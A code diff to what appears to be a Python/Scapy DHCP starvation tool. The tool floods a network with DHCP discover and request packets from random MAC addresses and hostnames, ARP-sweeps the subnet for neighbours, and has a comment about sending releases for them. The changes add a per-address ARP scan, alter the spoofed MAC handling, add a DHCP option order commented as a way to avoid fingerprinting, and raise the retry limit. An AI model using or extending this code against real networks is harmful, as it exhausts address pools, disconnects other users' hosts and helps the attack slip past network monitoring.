@@ -304,18 +304,16 @@ def toNum(ip):
     "convert decimal dotted quad string to long integer"
     return struct.unpack('L',socket.inet_aton(ip))[0]
 
-def get_ip(ifname):
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    return socket.inet_ntoa(fcntl.ioctl(
-        s.fileno(),
-        0x8915,  # SIOCGIFADDR
-        struct.pack('256s', ifname[:15])
-    )[20:24])
-
 def get_if_net(iff):
     for net, msk, gw, iface, addr in read_routes():
         if (iff == iface and net != 0L):
             return ltoa(net)
+    warning("No net address found for iface %s\n" % iff);
+
+def get_if_msk(iff):
+    for net, msk, gw, iface, addr in read_routes():
+        if (iff == iface and net != 0L):
+            return ltoa(msk)
     warning("No net address found for iface %s\n" % iff);
 
 def get_if_ip(iff):
@@ -435,12 +433,15 @@ def neighbors():
         
     else:
         m=randomMAC()
-        net=dhcpsip+"/"+calcCIDR(subnet)
-        ans,unans = srp(Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=net,psrc=dhcpsip), timeout=8,
-                        filter="arp and arp[7] = 2")
-        for request,reply in ans:
-            nodes[reply.hwsrc]=reply.psrc
-            LOG(type="<--", message=  "%15s - %s " % (reply.psrc, reply.hwsrc) )
+        myip=get_if_ip(conf.iface)
+        #print("my net = %s my msk =%s  CIDR=%s"%(get_if_net(conf.iface),get_if_msk(conf.iface),calcCIDR(get_if_msk(conf.iface))))
+        pool = Net(myip + "/" + calcCIDR(get_if_msk(conf.iface)))
+        for ip in pool:
+            LOG(type="<--", message=  "ARP: sending %15s - %s " % (ip, myip) )
+            ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip,psrc=myip), timeout=0.1, filter="arp and arp[7] = 2")
+            for request,reply in ans:
+                nodes[reply.hwsrc]=reply.psrc
+                LOG(type="<--", message=  "%15s - %s " % (reply.psrc, reply.hwsrc) )
 
 #
 # send release for our neighbors
@@ -499,17 +500,27 @@ class send_dhcp(threading.Thread):
         self.kill_received = False
 
     def run(self):
-        global TIMEOUT,dhcpdos,REQUEST_OPTS
-        while not self.kill_received and not dhcpdos:
+       global TIMEOUT,dhcpdos,REQUEST_OPTS
+       while not self.kill_received and not dhcpdos:
             m=randomMAC()
-            #m="00:00:00:00:00:00"
             myxid=random.randint(1, 900000000)
+            mymac=get_if_hwaddr(conf.iface)
             hostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
+            # Mac OS options order to avoid DHCP fingerprinting
+            myoptions = [
+                ("message-type", "discover"),
+                ("param_req_list", chr(1),chr(121),chr(3),chr(6),chr(15),chr(119),chr(252),chr(95),chr(44),chr(46)),
+                ("max_dhcp_size",1500),
+                ("client_id", chr(1), mac2str(m)),
+                ("lease_time",10000),
+                ("hostname", hostname),
+                ("end",'00000000000000')
+            ]
             if MODE_IPv6:
                 dhcp_discover=v6_build_discover(m,trid=myxid,options=REQUEST_OPTS)
                 LOG(type="-->", message= "v6_DHCP_Discover [cid:%s]"%(repr(str(dhcp_discover[DHCP6OptClientId].duid))))
             else:
-                dhcp_discover =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid)/DHCP(options=[("message-type","discover"),("hostname",hostname),"end"])
+                dhcp_discover =  Ether(src=mymac,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid,flags=0xFFFFFF)/DHCP(options=myoptions)
                 LOG(type="-->", message= "DHCP_Discover")
             sendPacket(dhcp_discover)
             if TIMEOUT['timer']>0: 
@@ -582,13 +593,13 @@ class sniff_dhcp(threading.Thread):
                         if opt[0] == 'subnet_mask':
                             subnet=opt[1]
                             break
-                    
+                    mymac = get_if_hwaddr(conf.iface)
                     myip=pkt[BOOTP].yiaddr
                     sip=pkt[BOOTP].siaddr
                     localxid=pkt[BOOTP].xid
                     localm=unpackMAC(pkt[BOOTP].chaddr)
                     myhostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
-                    LOG(type="<--", message= "DHCP_Offer   " + pkt[Ether].src +"\t"+sip + " IP: "+myip+" for MAC=["+pkt[Ether].dst+"]")
+                    LOG(type="<--", message= "DHCP_Offer   " + pkt[Ether].src +"\t"+sip + " IP: "+myip+" for MAC=["+localm+"]")
     
                     if SHOW_DHCPOPTIONS:
                         b = pkt[BOOTP]
@@ -606,7 +617,7 @@ class sniff_dhcp(threading.Thread):
                             else:
                                 LOG(type="DEBUG", message=  "\t\t* %s\t%s"%(o[0],o[1:])  )    
                     
-                    dhcp_req = Ether(src=localm,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(localm)],xid=localxid)/DHCP(options=[("message-type","request"),("server_id",sip),("requested_addr",myip),("hostname",myhostname),("param_req_list","pad"),"end"])
+                    dhcp_req = Ether(src=mymac,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(localm)],xid=localxid,flags=0xFFFFFF)/DHCP(options=[("message-type","request"),("server_id",sip),("requested_addr",myip),("hostname",myhostname),("param_req_list","pad"),"end"])
                     LOG(type="-->", message= "DHCP_Request "+myip)
                     sendPacket(dhcp_req)
                 elif SHOW_LEASE_CONFIRM and pkt[DHCP] and pkt[DHCP].options[0][1] == 5:
@@ -650,7 +661,6 @@ def main():
     dhcpdos=False 
     p_dhcp_advertise = None # contains dhcp advertise pkt once it is received (base for creating release())
 
-    
     LOG(type="DEBUG",message="Thread %d - (Sniffer) READY"%len(THREAD_POOL))
     t=sniff_dhcp()
     t.start()
@@ -662,7 +672,7 @@ def main():
         t.start()
         THREAD_POOL.append(t)
         
-    fail_cnt=5
+    fail_cnt=100
     while dhcpsip==None and fail_cnt>0:
         time.sleep(TIMEOUT['dhcpip'])
         LOG(type="?", message= "\t\twaiting for first DHCP Server response")
